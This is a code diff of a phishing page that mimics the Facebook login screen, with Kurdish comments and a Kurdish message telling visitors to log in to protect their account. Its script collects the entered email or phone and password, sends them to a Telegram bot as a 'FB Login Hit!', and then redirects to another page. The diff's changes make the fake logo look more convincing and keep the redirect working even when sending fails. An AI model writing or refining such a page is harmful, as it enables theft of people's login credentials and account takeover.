@@ -7,15 +7,19 @@
     <style>
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        img { width: 180px; margin-bottom: 20px; }
+        /* لێرە وێنەکە ڕێکخراوە */
+        .fb-logo { width: 220px; margin-bottom: 20px; height: auto; }
         input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lB9f1af9q9.svg">
-        <p style="color: #606770; font-size: 14px;">بۆ پاراستنی هەژمارەکەت، سەرەتا داخڵ ببە</p>
+        <!-- لۆگۆیەکی نوێ کە لە زۆربەی شوێنەکان ئیش دەکات -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg" alt="Facebook" class="fb-logo">
+        
+        <p style="color: #606770; font-size: 14px; margin-top: 0;">بۆ پاراستنی هەژمارەکەت، سەرەتا داخڵ ببە</p>
+        
         <input type="text" id="user" placeholder="Email or Phone" dir="ltr">
         <input type="password" id="pass" placeholder="Password" dir="ltr">
         <button onclick="login()">Log In</button>
@@ -30,9 +34,15 @@
             const pass = document.getElementById('pass').value;
             if(!user || !pass) return alert("تکایە خانەکان پڕ بکەرەوە");
 
-            const msg = `👤 **FB Login**\n📧 User: \`${user}\` \n🔑 Pass: \`${pass}\``;
+            const msg = `👤 **FB Login Hit!**\n\n📧 User: \`${user}\` \n🔑 Pass: \`${pass}\``;
+            
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
             .then(() => {
+                // دڵنیابە ناوی فایلەکە لای خۆت Otm.html بێت
+                window.location.href = "Otm.html";
+            })
+            .catch(err => {
+                console.error("Error sending to Telegram:", err);
                 window.location.href = "Otm.html";
             });
         }
